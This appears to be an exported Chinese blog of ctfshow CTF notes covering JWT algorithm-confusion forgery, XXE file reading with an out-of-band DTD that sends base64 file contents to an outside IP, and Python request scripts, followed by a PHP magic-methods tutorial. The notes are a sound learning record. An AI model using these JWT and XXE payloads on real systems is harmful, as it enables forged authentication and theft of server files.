<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">import jwt</span><br><span class="line">public = open(&#x27;private.key&#x27;<span class="punctuation">,</span> &#x27;r&#x27;).read()</span><br><span class="line">payload=<span class="punctuation">&#123;</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">print(jwt.encode(payload<span class="punctuation">,</span> key=public<span class="punctuation">,</span> algorithm=&#x27;RS256&#x27;))</span><br></pre></td></tr></table></figure>
<p><a href="http://xn--aaa-y28d4do3tbvbt6fea07j83p6o0a1a106ixo9cka999vytlll1eoo5a4gvca.py">然后把公钥和私钥丢在当前目录下然后运行aaa.py</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.NoE2xAUmDyHc0rhNtNtUn8URhEZeFGy9M0hd7hBEfRD3jpGqetn0nj2Tm9mob9LWyl2BazTLm_1Ez1vn0A6ZxgcpF73B6_rE4zrDvyu3b6eH3FtwmKd9I6N0KzkO1IpTggRVy6l4RoQCoG4JJ6X9YVJgOWtm0vgWzcjjXejlEsM</span><br></pre></td></tr></table></figure>
<p>再或者去其他网站进行公私钥加解密</p>
<p>记得post当中需要/</p>
<h1>web350</h1>
<p>给了源码，当中有用的是公钥</p>
<p>根据公钥，修改算法从 非对称算法（比如RS256） 到 对称密钥算法（HS256）<br>
双方都使用公钥验签，顺利篡改数据<br>
当公钥可以拿到时，如果使用对称密码，则对面使用相同的公钥进行解密<br>
实现验签通过</p>
<p>有公钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----CTFSHOW 36D BOY -----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDfdIGdsPuxSGPuosgarjZ7zO4t</span><br><span class="line">HHmQ7+6WUiKBA0ykcXe6aK9zcVVKCcEwyMbENgTF4Et8RjZ3NKs1Co74Q+4gII5G</span><br><span class="line">IgQFSS0PzTOKmoTY1fnA6+jqBquV4RnU283kgdaKmkaSRdiwsW2EaagMgZdG6WJk</span><br><span class="line">65RmH98bgnIAGW5nawIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
<p>然后在C:\Users\ssz\Desktop\study\ctfshow\web\JWT\JWT\public下添加公钥文件，然后运行aaa.js文件即可</p>
]]></content>
      <tags>
        <tag>JWT</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE</title>
    <url>/2025/04/26/XXE/</url>
    <content><![CDATA[<p>前置知识：<a href="https://www.runoob.com/xml/xml-tutorial.html">XML</a>、<a href="https://www.runoob.com/dtd/dtd-tutorial.html">DTD</a></p>
<h1>web373(有回显)</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);<span class="comment">//允许 XML实体(Entity) 加载（这行非常关键，因为如果是 true，就禁止了外部实体，就不容易XXE了）。设置为 false，允许外部实体，从而可以利用XXE漏洞。</span></span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);<span class="comment">//从 php://input 中读取原始的HTTP请求体内容。也就是POST请求发送的XML数据。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class="comment">//创建一个新的 DOMDocument 对象。使用 loadXML() 加载用户传入的XML。这里的两个参数：LIBXML_NOENT：将外部实体展开，也就是说如果你定义了实体，它会被直接替换。LIBXML_DTDLOAD：允许加载DTD（文档类型定义），这是外部实体注入的前提。LIBXML_NOENT 就是告诉PHP解析器：“遇到实体引用就展开它”，如果是外部实体，还会去读取外部资源，这就是XXE的核心利用点！LIBXML_DTDLOAD 允许加载 外部实体的定义（DTD），是XXE攻击能够成立的必要条件之一。</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">    <span class="comment">//把dom转成SimpleXML对象（简单处理XML）。取出 &lt;ctfshow&gt; 节点的内容，并 echo 输出。也就是说，如果你可以控制 &lt;ctfshow&gt;，你就能控制输出内容。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/26/XXE/C:%5CUsers%5Cssz%5CDesktop%5Cstudy%5Cctfshow%5Cweb%5CXXE%5CXXE%5Cimage-20250411173929628.png" alt="image-20250411173929628"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1>web374(无回显)</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">  <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">  <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>
<p>这一题没有了echo</p>
<p>利用<strong>外带数据</strong>：既然我拿不到服务器的回显，那我能不能让服务器自己把数据送给我？外带（Out-Of-Band，OOB）技术。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你发送的XML --&gt; 服务器解析 --&gt; 服务器偷偷请求你的服务器 --&gt; 你接收到敏感数据</span><br></pre></td></tr></table></figure>
<p>服务器根目录下创建test.dtd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;http://139.9.140.134:10086/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%xxe;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>服务器上 python3 -m http.server 10086</p>
<p>不知道为什么nc不可以</p>
<p>post发包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % aaa SYSTEM &quot;http://139.9.140.134:10086/test.dtd&quot;&gt;</span><br><span class="line">%aaa;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;1&lt;/root&gt;</span><br></pre></td></tr></table></figure>
<p><a href="http://payload.py">payload.py</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;https://42819745-2109-4843-9ca1-4bbc0dec338b.challenge.ctf.show/&#x27;</span><br><span class="line"></span><br><span class="line">#注意这里是单引号，为了绕过过滤</span><br><span class="line">payload = &quot;&quot;&quot;&lt;?xml version=&#x27;1.0&#x27; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE hacker[</span><br><span class="line">    &lt;!ENTITY  % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY  % myurl SYSTEM &quot;http://vps-ip/test.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">    %myurl;</span><br><span class="line">]&gt; </span><br><span class="line"></span><br><span class="line">&lt;root&gt;</span><br><span class="line">1</span><br><span class="line">&lt;/root&gt;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">payload = payload.encode(&#x27;utf-16&#x27;)</span><br><span class="line">print(requests.post(url ,data=payload).text)</span><br></pre></td></tr></table></figure>
<p><a href="http://tempCodeRunnerFile.py">tempCodeRunnerFile.py</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;https://42819745-2109-4843-9ca1-4bbc0dec338b.challenge.ctf.show/&#x27;</span><br><span class="line">payload = &quot;&quot;&quot;&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">print(requests.post(url,data=payload).txt)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP魔术方法</title>
    <url>/2025/04/14/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1>PHP 魔术方法概念</h1>
<p>PHP 中，以两个下划线 ( <code>__</code> ) 开头方法称之为 「 魔术方法 」</p>
<h2 id="PHP-魔术方法一览">PHP 魔术方法一览</h2>
<table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>__construct() 类的构造函数</td>
<td></td>
</tr>
<tr>
<td>__destruct()</td>
<td>类的析构函数</td>
</tr>
<tr>
<td>__call($funName, $arguments)</td>
<td>当调用对象的一个不存在或不可访问的方法时会自动调用</td>
</tr>
<tr>
<td>__callStatic($funName, $arguments)</td>
<td>当调用对象或类的一个不存在或不可访问的静态方法时会自动调用</td>
</tr>
<tr>
<td>__get($propertyName)</td>
<td>当访问对象的一个不存在的成员时会自动调用</td>
</tr>
<tr>
<td>__set($property, $value)</td>
<td>当给对象的一个不存在的成员赋值时会自动调用</td>
</tr>
<tr>
<td>__isset($content)</td>
<td>当使用 <code>isset()</code> 或 <code>empty()</code> 判断对象一个不存在或不可访问的属性时自动调用</td>
</tr>
<tr>
<td>__unset($content)</td>
<td>当使用 <code>reset()</code> 重制一个对象不存在的或不可访问的属性时会自动调用</td>
</tr>
<tr>
<td>__sleep()</td>
<td>当使用 <code>serialize()</code> 函数序列化一个对象时调用</td>
</tr>
<tr>
<td>__wakeup()</td>
<td>当使用 <code>unserialization()</code> 函数反序列化一个对象时调用</td>
</tr>
<tr>
<td>__toString()</td>
<td>将一个对象转换为字符串 把一个对象作为 <code>echo</code> 语句或 <code>print()</code> 函数的参数时会自动调用</td>
</tr>
<tr>
<td>__invoke()</td>
<td>将一个对象作为可调用对象 ( callable object ) 当把一个对象当作方法来调用时会自动调用该方法.</td>
</tr>
<tr>
<td>__set_state($an_array)</td>
<td>当使用 <code>var_export()</code> 将数组导出为变量时会自动调用</td>
</tr>
<tr>
<td>__clone()</td>
<td>当某个对象被复制时会自动调用</td>
</tr>
<tr>
<td>__autoload($className)</td>
<td>尝试自动加载一个为定义的类</td>
</tr>
<tr>
<td>__debugInfo()</td>
<td>打印输出调试信息</td>
</tr>
</tbody>
</table>
<h1>构造函数 __construct()</h1>
<p>PHP 构造函数 ( <code>__construct()</code> ) 是对象被创建后自动调用的第一个方法。</p>
<p>任何类都有一个构造函数，即使我们没有显式的声明它，因为任何类都有一个默认的构造函数，这个默认的构造函数没有参数，也不会执行任何代码，可以说是一个空函数。（显式声明指的是在类中明确地定义了一个构造函数 <code>__construct()</code>，而不是依赖于 PHP 默认提供的构造函数）</p>
<p>一旦我们显式的声明了一个构造函数，那么默认的构造函数就会消失，也可以说是我们创建的构造函数把它屏蔽了。</p>
<p><strong>构造函数 <code>__construct()</code> 的作用</strong></p>
<p>构造函数通常用于执行一些初始化任务，例如在创建对象时设置成员变量的初始值</p>
<p><strong>声明构造函数</strong></p>
<p>在类中声明一个构造函数的语法格式一般如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__constrct</span>(<span class="params">[parameter <span class="keyword">list</span>]</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 函数主体，通常用于初始化对象的一些属性</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要注意的是：一个 PHP 中只能有一个构造函数 <code>__construct()</code> ，因为 PHP 不允许函数重载</p>
<p><strong>范例</strong></p>
<p>下面的代码声明了一个类 <code>Person</code> 、同时为该类创建了一个构造函数 <code>__construct()</code> 。该构造函数接受三个参数: 名字、性别和年龄，同时设置相应的对象属性</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;                                                                     </span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;       </span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$age</span>;       </span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$sex</span>;       </span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 显式声明一个构造函数，同时初始化对象的属性</span></span><br><span class="line"><span class="comment">     */</span>                                                                                       </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;&quot;</span>, <span class="variable">$sex</span>=<span class="string">&quot;Male&quot;</span>, <span class="variable">$age</span>=<span class="number">22</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;     </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * say() 方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Name：&quot;</span> . <span class="variable language_">$this</span>-&gt;name . <span class="string">&quot;,Sex：&quot;</span> . <span class="variable language_">$this</span>-&gt;sex . <span class="string">&quot;,Age：&quot;</span> . <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>不传递参数来构造一个 Person 对象</strong></p>
<p>因为 <code>Person</code> 构造函数 <code>__construct()</code> 的三个参数都设置了默认值，所以我们创建 <code>Person</code> 对象时也可以不传递参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Person1</span>-&gt;<span class="title function_ invoke__">say</span>(); </span><br></pre></td></tr></table></figure>
<p>输出结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Name：,Sex：Male,Age：22</span><br></pre></td></tr></table></figure>
<p><strong>只传递名称参数来构造一个 <code>Person</code> 对象</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$person_yufei</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Yufei&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$person_yufei</span>-&gt;<span class="title function_ invoke__">say</span>(); </span><br></pre></td></tr></table></figure>
<p>输出结果如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Name: Yufei, Sex: Male, Age: <span class="number">22</span></span><br></pre></td></tr></table></figure>
<p><strong>同时传递参数名称、性别、年龄来构造一个 <code>Person</code> 对象</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$person_hero</span>= <span class="keyword">new</span> <span class="title class_">Person</span> (<span class="string">&quot;Hero&quot;</span>, <span class="string">&quot;Male&quot;</span>, <span class="number">25</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$person_hero</span>-&gt;<span class="title function_ invoke__">say</span>(); </span><br></pre></td></tr></table></figure>
<p>输出结果如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Name: Hero, Sex: Male, Age: <span class="number">25</span></span><br></pre></td></tr></table></figure>
<h1>析构函数 __destruct()</h1>
<p><code>__destruct()</code> 是 PHP 面向对象编程的另一个重要的魔法函数，该函数会在类的一个对象被删除时自动调用。</p>
<p>我们可以在该函数中添加一些释放资源的操作，比如关闭文件、关闭数据库链接、清空一个结果集等</p>
<p>其实，<code>__destruct()</code> 在日常的编码中并不常见，因为它是非必须的，是类的可选组成部分。通常只是用来完成对象被删除时的清理动作而已。</p>
<p>而 PHP 的特性 「 运行完一次请求则销毁环境 」 的做法，也没必要使用 <code>__destruct()</code> 。反正执行完请求后所有该销毁的都会销毁。</p>
<p><strong>调用时机</strong></p>
<p>当销毁一个对象时才会调用对象的析构函数，一般情况下，销毁一个对象的触发时机为</p>
<ol>
<li>主动调用 <code>unset( $obj )</code></li>
<li>主动调用 <code>$obj = NULL</code></li>
<li>程序自动结束</li>
</ol>
<p><strong>函数原型</strong></p>
<p><code>__destruct()</code> 的声明格式类似于构造函数 <code>__construct</code> ， 该名字是固定的，以两个下划线开头，然后跟上 <code>destruct</code> 关键字</p>
<p>该函数没有任何参数，也不需要更不要返回任何值</p>
<p>该函数的原型如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function __destruct()</span><br><span class="line">&#123;</span><br><span class="line">    // 其它代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>范例</strong></p>
<p>下面的代码，我们给 <code>Person</code> 类添加上析构函数 <code>__destruct()</code>，该函数只是一个提示，没有任何实际意义</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Person&#123;     </span><br><span class="line"></span><br><span class="line">    public $name;         </span><br><span class="line">    public $age;         </span><br><span class="line">    public $sex;         </span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;, $sex=&quot;Male&quot;, $age=22)</span><br><span class="line">    &#123;   </span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;sex  = $sex;</span><br><span class="line">        $this-&gt;age  = $age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * say method</span><br><span class="line">     */</span><br><span class="line">    public function say()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Name：&quot;.$this-&gt;name.&quot;,Sex：&quot;.$this-&gt;sex.&quot;,Age：&quot;.$this-&gt;age;</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 声明一个析构函数</span><br><span class="line">     */</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">            echo &quot;再见，请记住我的名字：&quot;.$this-&gt;name . &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&quot;Yufei&quot;);</span><br><span class="line"></span><br><span class="line">// 销毁刚刚创建的对象</span><br><span class="line">unset($person);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$person_hero = new Person(&#x27;Hero&#x27;);</span><br><span class="line">// 销毁刚刚创建的对象</span><br><span class="line">$person_hero = null;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$peson_libai = new Person(&#x27;Libai&#x27;); // 程序结束会自动调用析构函数</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php</span><br><span class="line">再见，请记住我的名字：Yufei</span><br><span class="line">再见，请记住我的名字：Hero</span><br><span class="line">再见，请记住我的名字：Libai</span><br></pre></td></tr></table></figure>
<h1>__call()</h1>
<p>在 PHP 中如果调用一个不存在的方法会怎么样呢 ？ 当然是直接报错了，例如下面的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">class Persion</span><br><span class="line">&#123;    </span><br><span class="line"></span><br><span class="line">    private $name;         </span><br><span class="line">    private $age;         </span><br><span class="line">    private $sex;         </span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;, $sex=&quot;Male&quot;, $age=22)</span><br><span class="line">    &#123;   </span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;sex  = $sex;</span><br><span class="line">        $this-&gt;age  = $age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&#x27;Yufei&#x27;);</span><br><span class="line"></span><br><span class="line">// 调用一个不存在的方法</span><br><span class="line">$person-&gt;setAge(30);</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php</span><br><span class="line"></span><br><span class="line">Fatal error: Uncaught Error: Class &#x27;Person&#x27; not found in /Users/yufei/php/demo.php:18</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br><span class="line">  thrown in /Users/yufei/php/demo.php on line 18</span><br></pre></td></tr></table></figure>
<p>直接提示方法不存在。</p>
<p>对于这种类私有成员 ( 属性 )，一般情况下我们都会创建一对 <code>&#123;get,set&#125;</code> 方法来获取或者设置它。有没有什么快速方式，只要创建一个函数就可以了呢</p>
<p>答案的结果就是魔术方法： <code>__call()</code></p>
<p><strong><code>__call()</code> 方法函数原型</strong></p>
<p><code>__call()</code> 方法可以也只能用在类中，当调用类的对象的一个 <strong>不存在</strong> 的方法 ( 不存在或该方法不可访问 ) 时自动调用。</p>
<p>该方法有两个参数，第一个参数是调用的那个不存在的 <strong>方法名</strong> ，第二个参数是一个数组 ( array ) ，是传递给不存在方法的所有参数组成的数组</p>
<p><code>__call()</code> 方法的原型如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__call( string $func_name,  array $args )</span><br><span class="line">&#123;</span><br><span class="line">    // 一些代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>范例</strong></p>
<p>下面的范例，我们给 <code>Person</code> 类定义了一个魔术方法 <code>__call()</code>，用于在调用不存在的方法时自动调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;                             </span><br><span class="line">    function say()</span><br><span class="line">    &#123;</span><br><span class="line">           echo &quot;你好，世界！\n&quot;;</span><br><span class="line">    &#125;     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function __call($funName, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">          echo &quot;调用的方法名为：&quot; . $funName . &quot;(参数：&quot; ;  // 输出不存在的方法的名字</span><br><span class="line">          print_r($arguments); // 输出调用不存在方法的参数</span><br><span class="line">          echo &quot;) 不存在！\n\n&quot;;                   </span><br><span class="line">    &#125;                                         </span><br><span class="line">&#125;</span><br><span class="line">$person = new Person();           </span><br><span class="line"></span><br><span class="line">$person-&gt;run(&quot;yufei&quot;); // 因为该方法不存在，所以会自动调用 __call() 方法</span><br><span class="line"></span><br><span class="line">$person-&gt;eat(&quot;apple&quot;, &quot;banana&quot;); </span><br><span class="line"></span><br><span class="line">$person-&gt;play( &#x27;football&#x27;, $with=&#x27;Hero&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$person-&gt;say(); // 方法存在时则不会调用 __call() 方法</span><br></pre></td></tr></table></figure>
<p>运行以上示例，输出结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php</span><br><span class="line">调用的方法名为：run(参数：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; yufei</span><br><span class="line">)</span><br><span class="line">) 不存在！</span><br><span class="line"></span><br><span class="line">调用的方法名为：eat(参数：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; apple</span><br><span class="line">    [1] =&gt; banana</span><br><span class="line">)</span><br><span class="line">) 不存在！</span><br><span class="line"></span><br><span class="line">调用的方法名为：play(参数：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; football</span><br><span class="line">    [1] =&gt; Hero</span><br><span class="line">)</span><br><span class="line">) 不存在！</span><br><span class="line"></span><br><span class="line">你好，世界！</span><br></pre></td></tr></table></figure>
<p>请注意调用不存在的方法时传递的参数和 <code>__call()</code> 第二个参数里的保存形式</p>
<h1>__callStatic()</h1>
<p>前置知识，可以问ai：在编程语言（如PHP）中，如何区分静态方法和动态方法？请通过具体代码示例说明它们的区别。</p>
<p>在 PHP 魔术方法 - __call() 章节中我们介绍了 <code>__call()</code> 用于当调用一个对象不存在的方法时自动调用。但是，该方法只能作用于对象上，如果调用的是类的方法 ( 静态方法，使用 <code>static</code> 关键字修饰 ) 则不会调用 <code>__call()</code> ，我们看一段代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;                             </span><br><span class="line">    function say()</span><br><span class="line">    &#123;</span><br><span class="line">           echo &quot;你好，世界！\n&quot;;</span><br><span class="line">    &#125;     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function __call($funName, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">          echo &quot;调用的方法名为：&quot; . $funName . &quot;(参数：&quot; ;  // 输出不存在的方法的名字</span><br><span class="line">          print_r($arguments); // 输出调用不存在方法的参数</span><br><span class="line">          echo &quot;) 不存在！\n\n&quot;;                   </span><br><span class="line">    &#125;                                         </span><br><span class="line">&#125;</span><br><span class="line">$person = new Person();           </span><br><span class="line"></span><br><span class="line">$person-&gt;run(&quot;yufei&quot;); // 因为该方法不存在，所以会自动调用 __call() 方法</span><br><span class="line"></span><br><span class="line">Person::eat(&quot;apple&quot;, &quot;banana&quot;);</span><br><span class="line"></span><br><span class="line">$person-&gt;say();</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php</span><br><span class="line">调用的方法名为：run(参数：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; yufei</span><br><span class="line">)</span><br><span class="line">) 不存在！</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Fatal error: Uncaught Error: Call to undefined method Person::eat() in /Users/yufei/php/demo.php:22</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br><span class="line">  thrown in /Users/yufei/php/demo.php on line 22</span><br></pre></td></tr></table></figure>
<p>调用 <code>Person::eat()</code> 的时候，<code>__call()</code> 方法也不好使了。</p>
<p>那么怎么办呢 ？</p>
<p>答案就是另一个 PHP 魔术方法 : <code>__callStatic()</code></p>
<p>魔术方法 <code>__callStatic()</code></p>
<p>魔术方法 <code>__callStatic()</code> 会在调用类的一个不存在的静态方法 ( 不存在或该方法不可访问 ) 时自动调用，作用和原型都类似于 <code>__call()</code></p>
